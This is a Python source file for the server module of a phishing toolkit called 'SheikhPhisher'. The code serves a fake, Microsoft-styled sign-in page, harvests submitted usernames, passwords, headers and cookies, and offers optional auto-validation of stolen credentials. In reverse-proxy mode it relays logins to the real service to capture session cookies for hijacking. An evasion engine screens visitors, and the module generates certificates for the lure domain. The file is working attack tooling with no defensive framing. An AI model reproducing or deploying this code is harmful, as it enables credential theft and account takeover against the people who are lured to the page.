#!/usr/bin/env python3
# modules/server.py - SheikhPhisher Phishing Server
# Reverse proxy + Flask server with session hijacking

import os, sys, re, json, time, uuid, ssl, logging, threading
from urllib.parse import urlparse, urljoin
from datetime import datetime

import requests
from flask import Flask, request, Response, render_template_string, redirect, send_from_directory, make_response, jsonify

from .harvester import CredentialHarvester
from .evasion import EvasionEngine

log = logging.getLogger(__name__)

class PhishingServer:
    """Main phishing server - operates in direct page or reverse proxy mode"""
    
    def __init__(self, host='0.0.0.0', port=443, domain='', template='microsoft365',
                 use_ssl=False, proxy_mode=False, target_url=None,
                 evasion_profile='balanced', config=None):
        self.host = host
        self.port = port
        self.domain = domain
        self.template_name = template
        self.use_ssl = use_ssl
        self.proxy_mode = proxy_mode
        self.target_url = target_url.rstrip('/') if target_url else None
        self.evasion_profile = evasion_profile
        self.config = config or {}
        
        self.app = Flask(__name__)
        self.harvester = CredentialHarvester(config)
        self.evasion = EvasionEngine(config, profile=evasion_profile)
        self.template_html = None
        self.phishlet_config = {}
        self.session_map = {}  # sess_id -> {cookies, tokens}
        
        self._load_template()
        self._setup_routes()
    
    def _load_template(self):
        """Load phishing page HTML template"""
        tmpl_dir = os.path.join('templates', self.template_name)
        index_path = os.path.join(tmpl_dir, 'index.html')
        phishlet_path = os.path.join(tmpl_dir, 'phishlet.yaml')
        
        if os.path.exists(index_path):
            with open(index_path, 'r') as f:
                self.template_html = f.read()
        else:
            # Generate from generic template
            self.template_html = self._generate_login_page()
        
        if os.path.exists(phishlet_path):
            import yaml
            with open(phishlet_path) as f:
                self.phishlet_config = yaml.safe_load(f)
    
    def _generate_login_page(self):
        """Generate a realistic login page dynamically"""
        return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ page_title }}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .login-container { background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 40px; width: 400px; max-width: 90%; }
        .logo { text-align: center; margin-bottom: 24px; }
        .logo img { height: 48px; }
        .logo h1 { font-size: 24px; font-weight: 600; color: #1a1a1a; margin-top: 16px; }
        .form-group { margin-bottom: 16px; }
        .form-group label { display: block; font-size: 14px; font-weight: 500; color: #333; margin-bottom: 6px; }
        .form-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; transition: border 0.2s; }
        .form-group input:focus { border-color: #0066ff; outline: none; box-shadow: 0 0 0 2px rgba(0,102,255,0.2); }
        .btn { width: 100%; padding: 12px; background: #0066ff; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .btn:hover { background: #0052cc; }
        .error { color: #d32f2f; font-size: 14px; margin-top: 8px; display: none; }
        .loader { display: none; text-align: center; margin: 16px 0; }
        .loader:after { content: " "; display: inline-block; width: 24px; height: 24px; border: 3px solid #ddd; border-radius: 50%; border-top-color: #0066ff; animation: spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #888; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="{{ logo_url }}" alt="Logo" onerror="this.style.display='none'">
            <h1>{{ page_title }}</h1>
        </div>
        <form id="loginForm" method="POST" action="/login">
            {% for field in fields %}
            <div class="form-group">
                <label for="{{ field.id }}">{{ field.label }}</label>
                <input type="{{ field.type }}" id="{{ field.id }}" name="{{ field.name }}" placeholder="{{ field.placeholder }}" required {{ 'autocomplete=off' if field.name == 'mfa_code' else '' }}>
            </div>
            {% endfor %}
            <div class="error" id="errorMsg">{{ error_message }}</div>
            <div class="loader" id="loader"></div>
            <button type="submit" class="btn" id="submitBtn">Sign in</button>
        </form>
        <div class="footer">
            <p>&copy; 2026 {{ company_name }}. All rights reserved.</p>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            document.getElementById('loader').style.display = 'block';
            document.getElementById('submitBtn').disabled = true;
        });
    </script>
</body>
</html>'''
    
    def _setup_routes(self):
        app = self.app
        
        @app.route('/', methods=['GET'])
        def index():
            if self.evasion.should_block(request):
                return self.evasion.block_response(), 403
            
            # Check if we should challenge first
            if self.evasion.needs_challenge(request):
                return self.evasion.serve_challenge(request)
            
            template_vars = {
                'page_title': self.phishlet_config.get('page_title', 'Sign in to your account'),
                'company_name': self.phishlet_config.get('company_name', 'Microsoft'),
                'logo_url': self.phishlet_config.get('logo_url', ''),
                'fields': self.phishlet_config.get('fields', [
                    {'id': 'username', 'label': 'Email', 'name': 'username', 'type': 'email', 'placeholder': 'someone@example.com'},
                    {'id': 'password', 'label': 'Password', 'name': 'password', 'type': 'password', 'placeholder': 'Enter your password'}
                ]),
                'error_message': self.phishlet_config.get('error_message', '')
            }
            return render_template_string(self.template_html, **template_vars)
        
        @app.route('/login', methods=['POST'])
        def handle_login():
            client_ip = request.remote_addr
            user_agent = request.headers.get('User-Agent', '')
            data = {k: v for k, v in request.form.items()}
            
            # Build full capture record
            capture_record = {
                'timestamp': datetime.utcnow().isoformat(),
                'ip': client_ip,
                'user_agent': user_agent,
                'headers': dict(request.headers),
                'credentials': data,
                'session_id': str(uuid.uuid4()),
                'cookies': {},
                'template': self.template_name
            }
            
            # Capture any session cookies that came with the request
            if request.cookies:
                capture_record['cookies'] = dict(request.cookies)
            
            # In proxy mode, forward to real service and capture response cookies
            if self.proxy_mode and self.target_url:
                try:
                    # Forward login to real service
                    session = requests.Session()
                    
                    # Determine content type
                    if request.content_type and 'json' in request.content_type:
                        forwarded_data = request.json
                    else:
                        forwarded_data = dict(request.form)
                    
                    # Forward with original headers preserved
                    headers = {
                        'User-Agent': user_agent,
                        'Accept': request.headers.get('Accept', '*/*'),
                        'Accept-Language': request.headers.get('Accept-Language', ''),
                        'Origin': self.target_url,
                        'Referer': request.url_root
                    }
                    
                    resp = session.post(
                        urljoin(self.target_url, '/login') if not self.target_url.endswith('/login') else self.target_url,
                        data=forwarded_data,
                        headers=headers,
                        allow_redirects=False
                    )
                    
                    # Capture cookies from response
                    for cookie_name, cookie_value in session.cookies.items():
                        capture_record['cookies'][cookie_name] = cookie_value
                    
                    # Also capture Set-Cookie headers
                    set_cookies = resp.headers.get('Set-Cookie', '')
                    if set_cookies:
                        capture_record['set_cookie_raw'] = set_cookies
                    
                    log.info(f"[PROXY] Forwarded login -> {self.target_url} | Status: {resp.status_code}")
                    
                    # Save capture
                    self.harvester.save(capture_record)
                    
                    # Auto-validate credentials
                    if self.config.get('capture', {}).get('auto_validate', False):
                        self.harvester.validate_against_api(capture_record)
                    
                    # Redirect to real service
                    redirect_url = self.phishlet_config.get('redirect_after', self.target_url)
                    response = make_response(redirect(redirect_url))
                    
                    # Copy any Set-Cookie headers from real response
                    if 'Set-Cookie' in resp.headers:
                        response.headers['Set-Cookie'] = resp.headers['Set-Cookie']
                    
                    return response
                    
                except Exception as e:
                    log.error(f"[PROXY] Forward error: {e}")
                    # Fall through to normal redirect
                    redirect_url = self.phishlet_config.get('redirect_after', 'https://www.office.com')
                    return redirect(redirect_url)
            
            # Direct mode - just capture and redirect
            self.harvester.save(capture_record)
            
            # Auto-validate if configured
            if self.config.get('capture', {}).get('auto_validate', False):
                threading.Thread(target=self.harvester.validate_against_api, args=(capture_record,), daemon=True).start()
            
            redirect_url = self.phishlet_config.get('redirect_after', 'https://www.office.com')
            return redirect(redirect_url)
        
        @app.route('/capture-session', methods=['POST'])
        def capture_session():
            """AJAX endpoint for session cookie capture from JS"""
            data = request.json or {}
            sess_id = data.get('session_id')
            cookies = data.get('cookies', {})
            if sess_id and cookies:
                self.session_map[sess_id] = cookies
                log.info(f"[SESSION] Captured session cookies for: {sess_id[:8]}...")
                return jsonify({'status': 'ok'})
            return jsonify({'status': 'error', 'message': 'missing data'}), 400
        
        @app.route('/health', methods=['GET'])
        def health():
            return jsonify({'status': 'running', 'mode': 'proxy' if self.proxy_mode else 'direct', 'template': self.template_name})
        
        @app.route('/<path:catchall>', methods=['GET', 'POST', 'PUT', 'DELETE'])
        def catch_all(catchall):
            """Catch-all for reverse proxy mode - forward to target"""
            if self.proxy_mode and self.target_url:
                target = urljoin(self.target_url, catchall)
                try:
                    headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'content-length']}
                    resp = requests.request(
                        method=request.method,
                        url=target,
                        headers=headers,
                        data=request.get_data(),
                        cookies=request.cookies,
                        allow_redirects=False
                    )
                    
                    # Capture any cookies from proxied responses
                    if resp.cookies:
                        pass  # Could log visited URLs
                    
                    excluded = ['content-encoding', 'content-length', 'transfer-encoding']
                    resp_headers = {k: v for k, v in resp.headers.items() if k.lower() not in excluded}
                    
                    return Response(resp.content, resp.status_code, resp_headers)
                except Exception as e:
                    log.warning(f"[PROXY] Forward failed for {catchall}: {e}")
                    return redirect(self.target_url)
            return redirect('/')
    
    def run(self):
        log.info(f"SheikhPhisher server starting on {self.host}:{self.port}")
        log.info(f"  Mode: {'REVERSE PROXY' if self.proxy_mode else 'DIRECT PAGE'}")
        log.info(f"  Template: {self.template_name}")
        log.info(f"  Target: {self.target_url if self.proxy_mode else 'N/A'}")
        log.info(f"  Evasion: {self.evasion_profile}")
        
        ssl_context = None
        if self.use_ssl:
            cert_path = os.path.join(self.config.get('server', {}).get('cert_dir', './certs'), f'{self.domain}.pem')
            key_path = os.path.join(self.config.get('server', {}).get('cert_dir', './certs'), f'{self.domain}-key.pem')
            
            if os.path.exists(cert_path) and os.path.exists(key_path):
                ssl_context = (cert_path, key_path)
                log.info(f"  SSL: Using existing cert for {self.domain}")
            elif self.config.get('server', {}).get('auto_cert', False):
                log.info(f"  SSL: Attempting auto-cert for {self.domain}...")
                # Auto-cert via acme/letsencrypt would go here
                # For now, generate self-signed
                self._generate_self_signed_cert(cert_path, key_path)
                ssl_context = (cert_path, key_path)
        
        self.app.run(host=self.host, port=self.port, ssl_context=ssl_context, debug=False, threaded=True)
    
    def _generate_self_signed_cert(self, cert_path, key_path):
        """Generate self-signed certificate for testing"""
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        import datetime
        
        os.makedirs(os.path.dirname(cert_path), exist_ok=True)
        
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.COMMON_NAME, self.domain),
        ])
        
        cert = x509.CertificateBuilder().subject_name(subject).issuer_name(issuer).public_key(
            key.public_key()
        ).serial_number(x509.random_serial_number()).not_valid_before(
            datetime.datetime.utcnow()
        ).not_valid_after(
            datetime.datetime.utcnow() + datetime.timedelta(days=365)
        ).add_extension(
            x509.SubjectAlternativeName([x509.DNSName(self.domain)]),
            critical=False
        ).sign(key, hashes.SHA256())
        
        with open(key_path, "wb") as f:
            f.write(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()))
        with open(cert_path, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        
        log.info(f"  Self-signed cert generated for {self.domain}")
    
    def start_campaign(self, campaign_config, harvester, delivery):
        """Full campaign orchestration"""
        log.info(f"Starting campaign: {campaign_config.get('name', 'Unnamed')}")
        # Implementation for campaign mode